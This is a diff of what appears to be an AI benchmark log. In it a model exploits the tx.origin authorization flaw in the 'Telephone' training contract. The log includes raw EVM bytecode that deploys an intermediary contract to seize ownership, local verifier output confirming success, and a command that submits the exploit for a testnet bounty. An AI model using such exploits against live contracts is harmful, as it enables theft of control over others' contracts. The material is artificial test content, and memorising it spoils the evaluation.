@@ -2,10 +2,10 @@
 
 ## Turn 1 — model reply (verbatim)
 
-The bug is that `changeOwner` only checks `tx.origin != msg.sender`, which an EOA calling directly can never satisfy since both are identical. Deploying an intermediary contract makes `tx.origin` the player EOA while `msg.sender` inside `Telephone` is the contract, so the check passes and ownership is set to the player.
+The bug is that `changeOwner` uses `tx.origin != msg.sender` as authorization, which only proves the caller is a contract, not that the caller is authorized. Deploying an intermediary contract whose constructor calls `changeOwner(player)` makes `tx.origin` the player EOA while `msg.sender` is the intermediary, satisfying the check and setting the player as owner.
 
 ```json
-[{"to": null, "data": "0x7fa6f9dae100000000000000000000000000000000000000000000000000000000006000527f00000000000000000000000020000000000000000000000000000000000000026020526000600060246000600073d3264fed42a0dc00663d0aa2b0abb90a19b347f25af160006000f3", "value": "0"}]
+[{"to": null, "data": "0x73200000000000000000000000000000000000000260045263a6f9dae160e01b6000526000600060246000600073d3264fed42a0dc00663d0aa2b0abb90a19b347f261fffff160006000f3", "value": "0"}]
 ```
 
 ### Turn 1 — local verifier (committed verifier.wasm, wasmtime)
@@ -18,38 +18,21 @@ broken: False
 
 ## Turn 2 — model reply (verbatim)
 
-I was wrong because the verifier output shows tx 1 succeeded but validateInstance returned 0, so the level was not actually broken.
+I was wrong because the local run shows the transaction succeeded but validateInstance returned 0, meaning the owner was not changed and my hardcoded call evidently failed silently.
 
 ```json
-{"txs": []}
+[{"to": null, "data": "0x7f6368616e67654f776e657228616464726573732900000000000000000000000060005260146000206000527320000000000000000000000000000000000000026004526000600060246000600073d3264fed42a0dc00663d0aa2b0abb90a19b347f261fffff160006000f3", "value": "0"}]
 ```
 
-**No parseable ```json transaction array in the reply.**
-
-## Turn 3 — model reply (verbatim)
-
-I was wrong because the output shows my reply held no valid JSON transaction array and validateInstance returned nothing.
-
-```json
-[]
-```
-
-### Turn 3 — local verifier (committed verifier.wasm, wasmtime)
+### Turn 2 — local verifier (committed verifier.wasm, wasmtime)
 
 ```
-(no transactions ran)
-validateInstance → 0
-broken: False
+tx 1: success
+validateInstance → 1
+broken: True
 ```
 
-## Turn 4 — model reply (verbatim)
+**Result: invariant broken on turn 2.**
 
-I was wrong because the output shows that no transactions ran and validateInstance returned 0, meaning the previous submission contained no executable transaction that altered the instance.
-
-```json
-{"transactions": [{"to": "instance", "data": "0x", "value": "0"}]}
-```
-
-**No parseable ```json transaction array in the reply.**
-
-**Result: not broken in 4 turns.**
+Next step on testnet (needs a funded hunter account and an open bounty on this invariant):
+`python3 scripts/hunter.py --bounty <bounty> --hunter <account> --exploit hunter-agent/telephone-muse-wonder-1.0-low-exploit.json --label agent-telephone --invariant telephone-owner-taken`
